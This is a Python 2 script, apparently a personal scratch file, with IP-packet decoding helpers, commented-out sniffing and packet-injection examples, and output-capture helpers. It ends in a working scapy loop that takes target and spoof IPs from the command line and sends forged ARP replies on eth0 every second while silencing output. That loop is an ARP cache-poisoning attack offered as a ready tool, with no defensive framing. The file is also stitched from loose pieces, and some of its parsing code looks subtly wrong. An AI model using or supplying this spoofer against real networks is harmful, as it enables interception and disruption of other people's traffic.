# import pcap
from construct.protocols.ipstack import ip_stack
import pcap
import sys
import string
import time
import socket
import struct
import pycap.capture
import getopt, dpkt
import socket,struct
import ipaddress
import pycap.constants, pycap.protocol, pycap.inject
def decode_ip_packet(s):
  d={}
  d['version']=(ord(s[0]) & 0xf0) >> 4
  d['header_len']=ord(s[0]) & 0x0f
  d['tos']=ord(s[1])
  d['total_len']=socket.ntohs(struct.unpack('H',s[2:4])[0])
  d['id']=socket.ntohs(struct.unpack('H',s[4:6])[0])
  d['flags']=(ord(s[6]) & 0xe0) >> 5
  d['fragment_offset']=socket.ntohs(struct.unpack('H',s[6:8])[0] & 0x1f)
  d['ttl']=ord(s[8])
  d['protocol']=ord(s[9])
  d['checksum']=socket.ntohs(struct.unpack('H',s[10:12])[0])
  d['source_address']=Int2IP(struct.unpack('i',s[12:16])[0])
  d['destination_address']=Int2IP(struct.unpack('i',s[16:20])[0])
  # print Int2IP(struct.unpack('i',s[16:20])[0])
  if d['header_len']>5:
    d['options']=s[20:4*(d['header_len']-5)]
  else:
    d['options']=None
  d['data']=s[4*d['header_len']:]
  return d

def Int2IP(ipnum):
    ipnum = abs(ipnum)
    o1 = int(ipnum / 16777216) % 256
    o2 = int(ipnum / 65536) % 256
    o3 = int(ipnum / 256) % 256
    o4 = int(ipnum) % 256
    return '%(o1)s.%(o2)s.%(o3)s.%(o4)s' % locals()

def getSourceAddress( data, timestamp):
  if not data:
    return

  if data[12:14]=='\x08\x00':
    decoded=decode_ip_packet(data[14:])
    return decoded['source_address']
    # print decoded['destination_address']

def getDestinationAddress( data, timestamp):
  if not data:
    return

  if data[12:14]=='\x08\x00':
    decoded=decode_ip_packet(data[14:])
    return decoded['destination_address']
 
# sniffing ona  device/ interface
# packetSniffer = pcap.pcap("eth0")
# print packetSniffer

# decode = { pcap.DLT_LOOP:dpkt.loopback.Loopback,
#                pcap.DLT_NULL:dpkt.loopback.Loopback,
#                pcap.DLT_EN10MB:dpkt.ethernet.Ethernet }[packetSniffer.datalink()]
# try:

#     for ts, pkt in packetSniffer:
#         print getDestinationAddress(pkt,ts)
# except KeyboardInterrupt:
#     nrecv, ndrop, nifdrop = packetSniffer.stats()
#    
# import pycap.constants, pycap.protocol, pycap.inject
# data = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
# ethernet = pycap.protocol.ethernet(type=pycap.constants.ethernet.ETHERTYPE_IP,source='00:03:93:44:a9:92',destination='00:50:ba:8f:c4:5f')
# ip = pycap.protocol.ip(version=4,
#                         length=pycap.constants.ip.HEADER_LENGTH + pycap.constants.icmp.ECHO_HEADER_LENGTH + len(data),
#                         id=1,
#                         offset=0,
#                         ttl=100,
#                         protocol=pycap.constants.ip.IPPROTO_ICMP,
#                         checksum=0,
#                         source="192.168.0.2",
#                         destination="216.239.51.100")
# icmp = pycap.protocol.icmpEchoRequest(0, 0, 0, 0)
# packet = (ethernet, ip, icmp, data)
# print packet
# # (Ethernet(type=0x800, 00:03:93:44:a9:92 -> 00:50:ba:8f:c4:5f), IP(proto=0x1, 192.168.0.2 -> 216.239.51.100), 
# # ICMP(type=0x8, code=0x0), 'ABCDEFGHIJKLMNOPQRSTUVWXYZ')
# pycap.inject.inject().inject(packet)

import sys
import time
from scapy.all import sniff, sendp, ARP, Ether
from cStringIO import StringIO
import contextlib
@contextlib.contextmanager
def capture():
    import sys
    from cStringIO import StringIO
    oldout,olderr = sys.stdout, sys.stderr
    try:
        out=[StringIO(), StringIO()]
        sys.stdout,sys.stderr = out
        yield out
    finally:
        sys.stdout,sys.stderr = oldout, olderr
        out[0] = out[0].getvalue()
        out[1] = out[1].getvalue()

# with capture() as out:
    # print 'hi'
class Capturing(list):
    def __enter__(self):
        self._stdout = sys.stdout
        sys.stdout = self._stringio = StringIO()
        return self
    def __exit__(self, *args):
        self.extend(self._stringio.getvalue().splitlines())
        sys.stdout = self._stdout

if len(sys.argv) < 3:
    print sys.argv[0] + " <target> <spoof_ip>"
    sys.exit(0)

iface = "eth0"
target_ip = sys.argv[1]
fake_ip = sys.argv[2]

ethernet = Ether()
arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")
packet = ethernet / arp

while True:
    with capture() as out:
      sendp(packet, iface=iface)
    time.sleep(1)


